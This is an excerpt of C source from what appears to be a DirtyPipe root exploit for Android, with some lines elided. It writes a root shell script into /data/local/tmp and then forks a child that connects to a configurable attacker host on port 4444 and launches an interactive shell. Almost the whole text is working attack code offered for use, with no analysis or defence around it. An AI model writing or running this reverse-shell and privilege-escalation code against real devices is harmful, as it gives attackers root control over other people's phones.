...
char* ip;
void root_shell() {
	// Create a backup root shell script as fallback
	FILE *script_fp = fopen("/data/local/tmp/root_shell.sh", "w");
	if (script_fp) {
		fprintf(script_fp, "#!/system/bin/sh\n");
		fprintf(script_fp, "# Root shell established via DirtyPipe\n");
		fprintf(script_fp, "export PATH=/system/bin:/system/xbin:/bin\n");
		fprintf(script_fp, "cd /data/local/tmp\n");
		fprintf(script_fp, "whoami\n");
		fprintf(script_fp, "id\n");
		fprintf(script_fp, "/system/bin/sh\n");
		fclose(script_fp);
		chmod("/data/local/tmp/root_shell.sh", 0755);
	}
	...
	if (child_pid == 0) {
		const char *RHOST = "127.0.0.1"; // Your host machine
		int RPORT = 4444;
		...
		inet_pton(AF_INET, RHOST, &serv_addr.sin_addr);
		...
		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
			...
			execl("/system/xbin/sh", "sh", "-i", NULL);
		}
		close(sock);
		exit(1);
	}
